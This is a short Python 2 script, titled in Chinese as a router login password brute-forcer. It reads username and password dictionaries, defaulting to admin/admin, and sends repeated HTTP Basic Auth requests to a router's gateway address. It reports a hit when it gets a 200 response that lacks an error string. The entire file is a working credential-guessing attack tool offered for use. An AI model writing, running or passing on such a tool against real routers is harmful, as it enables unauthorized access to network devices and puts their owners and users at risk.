#!/usr/bin/env python
# coding=utf-8

"""
路由器登录密码爆破
"""
import sys
import argparse
import requests
import base64

def gen_passwrod():
    if pwddict:
        with open(pwddict, 'r') as pwdfile:
            for p in pwdfile:
                yield p.strip()

    else:
        yield "admin"

def gen_user():
    if userdict:
        with open(userdict, 'r') as userfile:
            for u in userfile:
                yield u.strip()
    else:
        yield "admin"


def get_headers(user, password):
    headers = {"Authorization": "Basic %s" % base64.b64encode("%s:%s" % (user, password))}
    return headers

def do_guess(user, password):
    url = gateway
    if 'http' not in gateway:
        url = "http://%s" % gateway

    headers = get_headers(user, password)

    req = requests.get(url, headers=headers)
    print req.status_code

    # 针对部分路由器输入多次错误后返回200的页面提示错误
    if "有误" in req.content:
        print "faild %s:%s" % (user, password)
        return False

    elif req.status_code == 200:
        print "got it %s:%s" % (user, password)
        return True

    else:
        print "faild %s:%s" % (user, password)
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser( description='路由器登录密码爆破')

    parser.add_argument('-g', '--gateway', metavar='192.168.1.1', default="192.168.1.1", required=True, help='The router\'s ip address')
    parser.add_argument('-p', '--pwddict', required=False, help='password dict')
    parser.add_argument('-u', '--userdict', required=False, help='user dict')

    args = parser.parse_args()
    gateway = args.gateway
    pwddict = args.pwddict
    userdict = args.userdict


    for u in gen_user():
        for p in gen_passwrod():
            user, password = u, p
            result = do_guess(user, password)
            if result:
                sys.exit(1)
